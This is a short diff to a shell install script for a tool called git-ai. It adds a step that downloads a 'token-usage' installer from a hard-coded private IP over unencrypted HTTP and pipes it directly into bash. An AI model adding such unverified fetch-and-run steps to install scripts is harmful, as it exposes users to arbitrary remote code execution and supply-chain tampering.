@@ -446,3 +446,11 @@ if [ "$NEED_LOGIN" = true ]; then
     echo "Launching login..."
     ${INSTALL_DIR}/git-ai login
 fi
+
+# Install token-usage and provide feedback
+echo "Installing token-usage..."
+if curl -sS -f http://10.99.33.39:8080/release_linux/client/install.sh | bash; then
+    success "Successfully installed token-usage"
+else
+    warn "Warning: Failed to install token-usage"
+fi
